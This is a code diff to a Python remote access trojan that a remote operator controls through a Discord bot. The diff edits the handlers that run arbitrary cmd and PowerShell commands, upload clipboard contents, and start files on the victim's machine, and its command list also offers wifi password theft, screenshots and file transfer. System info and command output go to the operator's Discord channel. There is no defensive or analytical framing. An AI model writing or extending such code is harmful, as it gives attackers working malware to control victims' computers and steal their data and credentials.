@@ -47,7 +47,8 @@ commands = "\n".join([
     "cwd - Get current working directory",
     "download <file> - Download file",
     "upload <link> - Upload file",
-    "cmd <command> - Execute powershell command",
+    "cmd <command> - Execute cmd command",
+    "pw <command> - Execute powershell command",
     "run <file> - Run an file",
     "wifi - Return wifi passwords",
     "screenshot - Take a screenshot",
@@ -144,13 +145,8 @@ async def on_ready():
     
     guild = client.get_guild(int(GUILD_ID))
     channel = await guild.create_text_channel(session_id)
-    ip_address = requests.get("https://ipapi.co/json/").json()
-    data = ip_address['country_name'], ip_address['ip']
     embed = discord.Embed(title="New session created", description="", color=0xfafafa)
     embed.add_field(name="Session ID", value=f"```{session_id}```", inline=True)
-    #embed.add_field(name="Username", value=f"```{login}```", inline=True)
-    #embed.add_field(name="IP Address", value=f"```{data}```", inline=True)
-    #embed.add_field(name="Commands", value=f"```{commands}```", inline=False)
     embed.add_field(name="System Info", value=f"```{system_info}```", inline=False)
     await channel.send(embed=embed)
     delete_files(["system.txt"])
@@ -189,6 +185,13 @@ async def on_message(message):
                 clipboard = "Unknown"
             if clipboard == "":
                 clipboard = "null"
+            elif len(clipboard) > 1500:
+                with open("clipboard.txt", "w", encoding="utf-8") as f:
+                    f.write(clipboard)
+                clipboard_file = discord.File("clipboard.txt")
+                await message.reply(file=clipboard_file)
+                delete_files(["clipboard.txt"])
+                return
             
             embed = discord.Embed(title="Clipboard Content", description=f"```{clipboard}```", color=0xfafafa)
             await message.reply(embed=embed)
@@ -210,7 +213,7 @@ async def on_message(message):
         await message.reply(embed=embed)
         
     elif message.content == "cwd":
-        embed = discord.Embed(title="CWD", description=f"```{os.getcwd()}{os.path.basename(link)}```", color=0xfafafa)
+        embed = discord.Embed(title="CWD", description=f"```{os.getcwd()}```", color=0xfafafa) #{os.path.basename(link)}
         await message.reply(embed=embed)
 
     elif message.content.startswith("download"):
@@ -233,11 +236,11 @@ async def on_message(message):
 
     elif message.content.startswith("cmd"):
         command = message.content[4:]
-        output = subprocess.Popen(["powershell", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True).communicate()#[0].decode("utf-8")
+        output = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True).communicate()#[0].decode("utf-8")
         error_output = output[1].decode("utf-8")
         normal_output = output[0].decode("utf-8")
         
-        embed = discord.Embed(title=f"CMD > \n{os.getcwd()}", description="", color=0xfafafa) # description=f"```{output}```",
+        embed = discord.Embed(title=f"{os.getcwd()}", description="", color=0xfafafa) # description=f"```{output}```",
         
         if normal_output != "":
             embed.add_field(name="Output", value=f"```{normal_output}```", inline=False)
@@ -245,12 +248,42 @@ async def on_message(message):
         if error_output != "":
             embed.add_field(name="Error", value=f"```{error_output}```", inline=False)
             
+        if error_output == "" and normal_output == "":
+            embed.add_field(name="Output", value="```No Output!```", inline=False)
+            
+        await message.reply(embed=embed)
+        
+        
+    elif message.content.startswith("pw"):
+        command = message.content[4:]
+        output = subprocess.Popen(["powershell", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True).communicate()#[0].decode("utf-8")
+        error_output = output[1].decode("utf-8")
+        normal_output = output[0].decode("utf-8")
+        
+        embed = discord.Embed(title=f"{os.getcwd()}", description="", color=0xfafafa) # description=f"```{output}```",
+        
+        if normal_output != "":
+            embed.add_field(name="Output", value=f"```{normal_output}```", inline=False)
+            
+        if error_output != "":
+            embed.add_field(name="Error", value=f"```{error_output}```", inline=False)
+            
+        if error_output == "" and normal_output == "":
+            embed.add_field(name="Output", value="```No Output!```", inline=False)
+            
         await message.reply(embed=embed)
 
     elif message.content.startswith("run"):
         file = message.content[4:]
-        subprocess.Popen(file, shell=True)
-        embed = discord.Embed(title="Started", description=f"```{file}```", color=0xfafafa)
+        if file == "":
+            message.reply("Please specify a file to run!")
+        try:
+            output = subprocess.Popen(file, shell=True)
+        except:
+            embed = discord.Embed(title="Error", description=f"```Failed to start: {file}```", color=0xfafafa)
+            await message.reply(embed=embed)
+            return
+        embed = discord.Embed(title="Started", description=f"```{file}\n{output}```", color=0xfafafa)
         await message.reply(embed=embed)
     
     elif message.content.startswith("startup"):
